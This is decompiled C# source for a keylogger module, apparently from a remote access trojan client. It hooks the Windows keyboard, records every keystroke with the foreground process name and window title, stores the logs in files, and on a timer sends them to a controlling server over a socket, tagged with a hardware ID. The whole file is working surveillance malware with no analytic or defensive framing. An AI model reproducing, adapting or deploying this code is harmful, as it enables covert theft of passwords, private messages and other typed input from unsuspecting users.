using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Client.Connection;
using MessagePackLib.MessagePack;
using Params;

namespace Client;

public static class Keylogger
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private static string PrevActiveWindowTitle;

	public static KeylogParams Params = new KeylogParams();

	private const int WM_KEYDOWN = 256;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	private static int WHKEYBOARDLL = 13;

	public static void SendLog()
	{
		try
		{
			string text = string.Empty;
			if (File.Exists(KeylogParams.OnlineSaveFileName))
			{
				text = File.ReadAllText(KeylogParams.OnlineSaveFileName);
			}
			if (ClientSocket.IsConnected && !string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "keyLogger";
				msgPack.ForcePathObject("hwid").AsString = Settings.Hw_id;
				msgPack.ForcePathObject("log").AsString = text;
				ClientSocket.Send(msgPack.Encode2Bytes());
				File.Delete(KeylogParams.OnlineSaveFileName);
			}
		}
		catch
		{
		}
	}

	public static void Run()
	{
		new Thread((ThreadStart)delegate
		{
			while (true)
			{
				Thread.Sleep(Params.interval * 1000);
				SendLog();
			}
		}).Start();
		_hookID = SetHook(_proc);
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(process.ProcessName), 0u);
	}

	private static string KeyboardLayout(uint vkCode)
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] lpKeyState = new byte[256];
			if (!GetKeyboardState(lpKeyState))
			{
				return "";
			}
			uint wScanCode = MapVirtualKey(vkCode, 0u);
			IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out var _));
			ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, keyboardLayout);
			return stringBuilder.ToString();
		}
		catch
		{
		}
		return ((object)(Keys)vkCode/*cast due to constrained. prefix*/).ToString();
	}

	private static bool FilterProcessWindow(string proc, string wintitle)
	{
		if (Params.filters.Count == 0)
		{
			return true;
		}
		foreach (string filter in Params.filters)
		{
			string value = filter.ToLower();
			if (proc.ToLower().Contains(value) || wintitle.ToLower().Contains(value))
			{
				return true;
			}
		}
		return false;
	}

	private static string GetActiveProcessName()
	{
		GetWindowThreadProcessId(GetForegroundWindow(), out var lpdwProcessId);
		string result = string.Empty;
		Process processById = Process.GetProcessById((int)lpdwProcessId);
		if (processById != null)
		{
			result = processById.ProcessName;
		}
		return result;
	}

	private unsafe static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Invalid comparison between Unknown and I4
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Invalid comparison between Unknown and I4
		//IL_019b: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Invalid comparison between Unknown and I4
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Invalid comparison between Unknown and I4
		try
		{
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				string activeProcessName = GetActiveProcessName();
				string activeWindowTitle = GetActiveWindowTitle();
				if (!Params.isEnabled || !FilterProcessWindow(activeProcessName, activeWindowTitle))
				{
					return CallNextHookEx(_hookID, nCode, wParam, lParam);
				}
				int num = Marshal.ReadInt32(lParam);
				bool num2 = (GetKeyState(20) & 0xFFFF) != 0;
				bool flag = (GetKeyState(160) & 0x8000) != 0 || (GetKeyState(161) & 0x8000) != 0;
				string text = KeyboardLayout((uint)num);
				text = ((!(num2 | flag)) ? text.ToLower() : text.ToUpper());
				Keys val = (Keys)num;
				if ((int)val >= 112 && (int)val <= 135)
				{
					text = "[" + ((object)(Keys)num/*cast due to constrained. prefix*/).ToString() + "]";
				}
				else
				{
					if (((IEnumerable<Keys>)(object)new Keys[17]
					{
						(Keys)27,
						(Keys)8,
						(Keys)9,
						(Keys)20,
						(Keys)91,
						(Keys)92,
						(Keys)164,
						(Keys)165,
						(Keys)162,
						(Keys)163,
						(Keys)37,
						(Keys)39,
						(Keys)38,
						(Keys)40,
						(Keys)46,
						(Keys)36,
						(Keys)35
					}).Contains(val))
					{
						text = "[" + ((object)(*(Keys*)(&val))/*cast due to constrained. prefix*/).ToString() + "]";
					}
					if ((int)val == 13)
					{
						text = "[Enter]\r\n";
					}
					if ((int)val == 32)
					{
						text = " ";
					}
				}
				if (!string.IsNullOrEmpty(text))
				{
					StringBuilder stringBuilder = new StringBuilder();
					if (PrevActiveWindowTitle == activeWindowTitle)
					{
						stringBuilder.Append(text);
					}
					else
					{
						stringBuilder.Append(Environment.NewLine);
						stringBuilder.Append(Environment.NewLine);
						stringBuilder.Append("----- [" + DateTime.Now.ToString("MM-dd HH:mm:ss") + "] : [" + activeProcessName + "] [" + activeWindowTitle + "]");
						stringBuilder.Append(Environment.NewLine);
						stringBuilder.Append(text);
					}
					Log(stringBuilder.ToString());
					PrevActiveWindowTitle = activeWindowTitle;
				}
			}
			return CallNextHookEx(_hookID, nCode, wParam, lParam);
		}
		catch
		{
			return IntPtr.Zero;
		}
	}

	private static void Log(string log)
	{
		if (Params.isEnabled)
		{
			File.AppendAllText(KeylogParams.OfflineSaveFileName, log);
			if (ClientSocket.IsConnected)
			{
				File.AppendAllText(KeylogParams.OnlineSaveFileName, log);
			}
		}
	}

	private static string GetActiveWindowTitle()
	{
		try
		{
			GetWindowThreadProcessId(GetForegroundWindow(), out var lpdwProcessId);
			Process processById = Process.GetProcessById((int)lpdwProcessId);
			string text = processById.MainWindowTitle;
			if (string.IsNullOrWhiteSpace(text))
			{
				text = processById.ProcessName;
			}
			return text;
		}
		catch (Exception)
		{
			return "???";
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern short GetKeyState(int keyCode);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint idThread);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);
}
